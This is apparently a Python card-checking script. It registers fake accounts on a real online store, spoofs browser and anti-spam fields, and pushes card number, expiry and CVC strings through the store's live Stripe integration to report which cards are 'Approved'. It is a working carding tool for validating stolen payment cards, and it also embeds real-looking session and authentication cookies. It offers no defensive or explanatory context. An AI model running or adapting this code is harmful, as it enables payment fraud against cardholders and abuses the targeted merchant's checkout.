import os

try:
    import pyfiglet, webbrowser, user_agent, time
    import requests
    import re
    import base64
    import random
    import string
    
except ImportError as e:
    print("حدث خطأ في استدعاء مكتبة:", e)
    print("يتم تثبيت المكتبات...")
    os.system('pip install pyfiglet user_agent requests')
    import pyfiglet
    import webbrowser
    import user_agent
    import time
    import requests
    import re
    import base64
    import random
    import string
    import requests


def st(ccx):
	import requests
	import re
	import random
	import string
	import base64
	from user_agent import generate_user_agent
	ccx=ccx.strip()
	n = ccx.split("|")[0]
	mm = ccx.split("|")[1]
	yy = ccx.split("|")[2]
	cvc = ccx.split("|")[3]
	if "20" in yy:#Mo3gza
		yy = yy.split("20")[1]
	user = user_agent.generate_user_agent()
			
	r = requests.session()
		

	def generate_random_account():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=4))
					
		return f"{name}{number}@yahoo.com"
	acc = (generate_random_account())
				
			
	def username():
		name = ''.join(random.choices(string.ascii_lowercase, k=20))
		number = ''.join(random.choices(string.digits, k=20))
					
		return f"{name}{number}"
	username = (username())
				
	def generate_random_code(length=32):
		letters_and_digits = string.ascii_letters + string.digits
		return ''.join(random.choice(letters_and_digits) for _ in range(length))
				
	corr = generate_random_code()
				
	sess = generate_random_code()
	
	headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_gcl_au=1.1.1257636661.1726584879; _fbp=fb.1.1726584878844.479347910518037130; _ga=GA1.1.1650797563.1726584880; tracker_device=8f994837-8bb5-4910-a29f-be120fe243db; __ctmid=66e998300005e700224144e0; __ctmid=66e998300005e700224144e0; mailchimp_landing_site=https%3A%2F%2Fwww.baileybox.com%2Fwp-admin%2Fadmin-ajax.php; __stripe_mid=00616966-82a9-40e4-85cf-a25c38fdb9683c7229; __stripe_sid=c9cfc346-23fb-427a-af2a-5b15fab1b70daa22ad; mailchimp_user_email=adfeaqfa%40gmail.com; wordpress_test_cookie=WP+Cookie+check; mailchimp.cart.previous_email=adfeaqfa@gmail.com; mailchimp.cart.current_email=adfeaqfaasdas@gmail.com; _ga_S03BHRSB12=GS1.1.1726584879.1.1.1726584960.45.0.1454347490',
    'Origin': 'https://www.baileybox.com',
    'Referer': 'https://www.baileybox.com/my-account/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}

	response = r.get('https://www.baileybox.com/my-account/', cookies=r.cookies, headers=headers)

	register = re.search(r'name="woocommerce-register-nonce" value="(.*?)"', response.text).group(1)
				
	headers = {
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Cache-Control': 'max-age=0',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded',
    # 'Cookie': '_gcl_au=1.1.1257636661.1726584879; _fbp=fb.1.1726584878844.479347910518037130; _ga=GA1.1.1650797563.1726584880; tracker_device=8f994837-8bb5-4910-a29f-be120fe243db; __ctmid=66e998300005e700224144e0; __ctmid=66e998300005e700224144e0; mailchimp_landing_site=https%3A%2F%2Fwww.baileybox.com%2Fwp-admin%2Fadmin-ajax.php; __stripe_mid=00616966-82a9-40e4-85cf-a25c38fdb9683c7229; __stripe_sid=c9cfc346-23fb-427a-af2a-5b15fab1b70daa22ad; mailchimp_user_email=adfeaqfa%40gmail.com; wordpress_test_cookie=WP+Cookie+check; mailchimp.cart.previous_email=adfeaqfa@gmail.com; mailchimp.cart.current_email=adfeaqfaasdas@gmail.com; _ga_S03BHRSB12=GS1.1.1726584879.1.1.1726584960.45.0.1454347490',
    'Origin': 'https://www.baileybox.com',
    'Referer': 'https://www.baileybox.com/my-account/',
    'Sec-Fetch-Dest': 'document',
    'Sec-Fetch-Mode': 'navigate',
    'Sec-Fetch-Site': 'same-origin',
    'Sec-Fetch-User': '?1',
    'Upgrade-Insecure-Requests': '1',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
	
	data = {
    'username': username,
    'email': acc,
    'mailchimp_woocommerce_newsletter': '1',
    'woocommerce-register-nonce': register,
    '_wp_http_referer': '/my-account/',
    'register': 'Register',
    'ak_bib': '1726584956048',
    'ak_bfs': '1726584960717',
    'ak_bkpc': '14',
    'ak_bkp': '9;1,1;360,706;112,8;128;119,10;129,23;39,7;71,120;152;136,16;128,120;95,16;128,80;',
    'ak_bmc': '64;61,259;60,2788;45,1051;40,1344;',
    'ak_bmcc': '5',
    'ak_bmk': '2;3',
    'ak_bck': '',
    'ak_bmmc': '2',
    'ak_btmc': '0',
    'ak_bsc': '2',
    'ak_bte': '',
    'ak_btec': '0',
    'ak_bmm': '1632,969;1002,1041;',
}

	response = r.post('https://www.baileybox.com/my-account/', cookies=r.cookies, headers=headers, data=data)
	
	
	headers = {
	    'accept': 'application/json, text/javascript, */*; q=0.01',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
    'origin': 'https://staging.norfolkmeadowsoaps.co.uk',
    'priority': 'u=1, i',
    'referer': 'https://staging.norfolkmeadowsoaps.co.uk/my-account/add-payment-method/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-origin',
    'user-agent': user,
}
	
	response = r.get('https://www.baileybox.com/my-account/add-payment-method/', cookies=r.cookies, headers=headers)
	
	nonce=re.findall(r'"add_card_nonce":"(.*?)"',response.text)[0]
	
	
	headers = {
	    'accept': 'application/json',
    'accept-language': 'ar,en-US;q=0.9,en;q=0.8',
    'content-type': 'application/x-www-form-urlencoded',
    'origin': 'https://js.stripe.com',
    'priority': 'u=1, i',
    'referer': 'https://js.stripe.com/',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
    'sec-fetch-dest': 'empty',
    'sec-fetch-mode': 'cors',
    'sec-fetch-site': 'same-site',
    'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
}
	
	data = f'type=card&owner[name]=+&owner[email]={acc}&card[number]={n}&card[cvc]={cvc}&card[exp_month]={mm}&card[exp_year]={yy}&guid=78502b00-c105-497b-a387-9c3a944bf38c9a78ff&muid=00616966-82a9-40e4-85cf-a25c38fdb9683c7229&sid=c9cfc346-23fb-427a-af2a-5b15fab1b70daa22ad&payment_user_agent=stripe.js%2F9995029ece%3B+stripe-js-v3%2F9995029ece%3B+card-element&referrer=https%3A%2F%2Fwww.baileybox.com&time_on_page=43461&key=pk_live_51HUGqfI9BolQkZWDB1L6wy1IWAxxumF7xYlt1LKuwPhpun0DERaQiGOH4UANnUlRM6LoXTmzvHKNaZevOFszeEzT00sc2dZpvN'
	
	response = requests.post('https://api.stripe.com/v1/sources', headers=headers, data=data)

	try:
	 id=response.json()['id']
	except:
		return(response.json()['error']['message'])
	
	headers = {
	    'Accept': 'application/json, text/javascript, */*; q=0.01',
    'Accept-Language': 'ar,en-US;q=0.9,en;q=0.8',
    'Connection': 'keep-alive',
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
    # 'Cookie': '_gcl_au=1.1.1257636661.1726584879; _fbp=fb.1.1726584878844.479347910518037130; _ga=GA1.1.1650797563.1726584880; tracker_device=8f994837-8bb5-4910-a29f-be120fe243db; __ctmid=66e998300005e700224144e0; __ctmid=66e998300005e700224144e0; mailchimp_landing_site=https%3A%2F%2Fwww.baileybox.com%2Fwp-admin%2Fadmin-ajax.php; __stripe_mid=00616966-82a9-40e4-85cf-a25c38fdb9683c7229; __stripe_sid=c9cfc346-23fb-427a-af2a-5b15fab1b70daa22ad; wordpress_test_cookie=WP+Cookie+check; mailchimp.cart.previous_email=adfeaqfa@gmail.com; mailchimp.cart.current_email=adfeaqfaasdas@gmail.com; mailchimp_user_previous_email=adfeaqfaasdas%40gmail.com; mailchimp_user_email=adfeaqfaasdas%40gmail.com; wordpress_logged_in_bb0cea89e938ddb203e757c88d1ecbe5=adfeaqfaasdsa%40gmail.com%7C1727794562%7CVaAh49r5jL9K42AtbT7nvs30b0L976r78MMjUaA8Lu8%7C67d15437bccff786130447fd490b519b4a302de6ffc13f388cdaecd635770361; wfwaf-authcookie-5608d1034d0f8f10e67a80150e983262=534230%7Cother%7Cread%7Cac7610f5ea11e964040467158c198f13497723ae71ae035e6f495f1fbc5e4744; _ga_S03BHRSB12=GS1.1.1726584879.1.1.1726585139.5.0.1454347490',
    'Origin': 'https://www.baileybox.com',
    'Referer': 'https://www.baileybox.com/my-account/add-payment-method/',
    'Sec-Fetch-Dest': 'empty',
    'Sec-Fetch-Mode': 'cors',
    'Sec-Fetch-Site': 'same-origin',
    'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36',
    'X-Requested-With': 'XMLHttpRequest',
    'sec-ch-ua': '"Chromium";v="128", "Not;A=Brand";v="24", "Google Chrome";v="128"',
    'sec-ch-ua-mobile': '?0',
    'sec-ch-ua-platform': '"Windows"',
}
	
	params = {
	    'wc-ajax': 'wc_stripe_create_setup_intent',
	}
	
	data = {
	    'stripe_source_id': id,
	    'nonce': nonce,
	}
	
	r3 = r.post('https://www.baileybox.com/', params=params, cookies=r.cookies, headers=headers, data=data)
	if 'success' in r3 or 'successfully' in r3 or 'thank you' in r3 or 'thanks' in r3 or 'approved' in r3 or 'fund' in r3:
			return 'Approved'
	else:
		return r3.json()['error']['message']



